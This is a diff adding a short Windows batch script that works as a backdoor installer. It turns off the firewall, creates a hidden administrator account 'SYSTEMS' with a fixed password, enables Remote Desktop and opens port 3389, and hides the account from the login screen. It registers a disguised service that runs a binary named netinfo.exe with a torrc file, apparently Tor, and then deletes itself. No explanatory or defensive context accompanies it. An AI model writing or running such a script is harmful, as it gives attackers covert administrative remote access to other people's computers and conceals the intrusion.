@@ -1,0 +1,18 @@
+@echo off 
+rem powershell "Set-MpPreference -DisableRealtimeMonitoring $true"
+netsh advfirewall set allprofiles state off
+
+net user SYSTEMS "qc69t4B#Z0" /add
+net localgroup Administratoren SYSTEMS /ADD
+
+reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0x00000000 /f
+reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-TCP" /v UserAuthentication /t REG_DWORD /d 0x00000001 /f
+netsh advfirewall firewall add rule name=\"Remote Desktop\" protocol=TCP dir=in localport=3389 action=allow
+netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
+reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v systems /t REG_DWORD /d 0 /f
+sc create "wininidsrv" binpath= "cmd /c start "C:\programdata\admin\netinfo.exe" -f C:\programdata\admin\torrc "&&sc config "rdpclips" start= auto&&net start rdpclips
+C:\programdata\admin\netinfo.exe -f C:\programdata\admin\torrc
+
+timeout 3 > nul
+
+del C:\programdata\start.bat
